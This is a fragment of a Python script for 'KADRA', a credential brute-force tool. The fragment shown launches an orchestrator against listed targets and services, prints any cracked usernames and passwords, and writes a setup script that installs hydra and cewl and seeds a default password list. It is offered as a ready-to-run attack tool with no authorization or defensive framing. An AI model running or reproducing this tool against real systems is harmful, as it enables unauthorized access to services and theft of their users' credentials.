    print(f"{Colors.info('Attack Strategy:')}")
    print(f"  1. {Colors.success('Common passwords')} (default list)")
    print(f"  2. {Colors.success('Target-specific wordlists')} (CeWL generated)")
    print(f"{Colors.info('Targeted Services:')}")
    for service, info in Config.SERVICES.items():
        service_color = info.get('color', Colors.BOLD_WHITE)
        print(f"  {service_color}• {service.upper():<6}{Colors.RESET} :{info['port']}")
    
    input(f"\n{Colors.warning('Press Enter to start the attack or Ctrl+C to cancel...')}")
    
    orchestrator = BruteforceOrchestrator()
    results = orchestrator.run_against_targets(targets, wordlists)
    
    # Print final summary
    print(f"\n{Colors.header('FINAL SUMMARY')}")
    
    total_targets = len(results)
    total_creds = 0
    successful_targets = 0
    
    for target, result in results.items():
        creds = result.get('credentials_found', [])
        if creds:
            successful_targets += 1
            total_creds += len(creds)
    
    # Summary box
    print(f"{Colors.BOLD_CYAN}┌{'─' * 58}┐{Colors.RESET}")
    print(f"{Colors.BOLD_CYAN}│{Colors.RESET} {Colors.BOLD_WHITE}KADRA - Attack Results Summary{' ' * 25}{Colors.BOLD_CYAN}│{Colors.RESET}")
    print(f"{Colors.BOLD_CYAN}├{'─' * 58}┤{Colors.RESET}")
    print(f"{Colors.BOLD_CYAN}│{Colors.RESET} {Colors.info('Targets Scanned:')} {Colors.BOLD_WHITE}{total_targets:>42}{Colors.BOLD_CYAN} │{Colors.RESET}")
    print(f"{Colors.BOLD_CYAN}│{Colors.RESET} {Colors.success('Successful Attacks:')} {Colors.BOLD_GREEN}{successful_targets:>39}{Colors.BOLD_CYAN} │{Colors.RESET}")
    print(f"{Colors.BOLD_CYAN}│{Colors.RESET} {Colors.credential('Credentials Found:')} {Colors.BOLD_GREEN}{total_creds:>39}{Colors.BOLD_CYAN} │{Colors.RESET}")
    print(f"{Colors.BOLD_CYAN}├{'─' * 58}┤{Colors.RESET}")
    print(f"{Colors.BOLD_CYAN}│{Colors.RESET} {Colors.info('Results Directory:')} {Colors.target(str(Config.RESULTS_DIR)):<35}{Colors.BOLD_CYAN} │{Colors.RESET}")
    print(f"{Colors.BOLD_CYAN}│{Colors.RESET} {Colors.info('Log File:')} {Colors.target(str(Config.LOG_FILE)):<42}{Colors.BOLD_CYAN} │{Colors.RESET}")
    print(f"{Colors.BOLD_CYAN}└{'─' * 58}┘{Colors.RESET}")
    
    # Show credentials found
    if total_creds > 0:
        print(f"\n{Colors.success('CREDENTIALS DISCOVERED:')}")
        for target, result in results.items():
            creds = result.get('credentials_found', [])
            if creds:
                print(f"\n{Colors.target(f'Target: {target}')}")
                for i, cred in enumerate(creds, 1):
                    service_color = Config.SERVICES[cred.get('service', '')].get('color', Colors.BOLD_WHITE)
                    print(f"  {Colors.BOLD_WHITE}{i}.{Colors.RESET} {service_color}{cred.get('service', '').upper():<6}{Colors.RESET}")
                    print(f"     {Colors.BOLD_CYAN}Username:{Colors.RESET} {Colors.credential(cred.get('username', ''))}")
                    print(f"     {Colors.BOLD_CYAN}Password:{Colors.RESET} {Colors.credential(cred.get('password', ''))}")
                    print(f"     {Colors.BOLD_CYAN}Source:{Colors.RESET} {cred.get('password_source', 'unknown')}")
    else:
        print(f"\n{Colors.warning('No credentials were found during this attack.')}")
        print(f"{Colors.info('Try using different password lists or increasing timeout values.')}")
    
    print(f"\n{Colors.success('KADRA execution completed!')}")

# ============================================
# QUICK SETUP SCRIPT
# ============================================
def create_setup_script():
    """Create setup script for KADRA"""
    setup_content = '''#!/bin/bash
echo -e "\033[1;36m[+] Setting up KADRA...\033[0m"

# Install dependencies
sudo apt update
sudo apt install -y hydra cewl python3 python3-pip

# Create necessary files
touch targets.txt passlist.txt

# Add sample content to passlist.txt
cat > passlist.txt << 'EOF'
admin
password
123456
password123
administrator
root
toor
admin123
test
guest
qwerty
letmein
EOF

# Make script executable
chmod +x kadra.py

echo -e "\033[1;32m[+] Setup complete!\033[0m"
echo -e "\033[1;33m[*] Edit targets.txt with your targets\033[0m"
echo -e "\033[1;33m[*] Run: python3 kadra.py\033[0m"
'''

    with open('setup_kadra.sh', 'w') as f:
        f.write(setup_content)
    
    os.chmod('setup_kadra.sh', 0o755)
    print(Colors.info("Created setup_kadra.sh"))
    print(Colors.info("Run: sudo bash setup_kadra.sh"))

# ============================================
# ENTRY POINT
# ============================================
if __name__ == "__main__":
    try:
        # Create directories if they don't exist
        Config.WORDLIST_DIR.mkdir(exist_ok=True)
        Config.RESULTS_DIR.mkdir(exist_ok=True)
        
        # Check for setup
        if not Config.PASSLIST_FILE.exists():
            print(Colors.warning("Password list not found. Creating default..."))
            PasswordManager.load_passlist()  # This creates default
        
        # Run main
        main()
        
    except KeyboardInterrupt:
        print(f"\n\n{Colors.error('KADRA interrupted by user')}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.error(f'Fatal error: {e}')}")
        import traceback
        traceback.print_exc()
        sys.exit(1)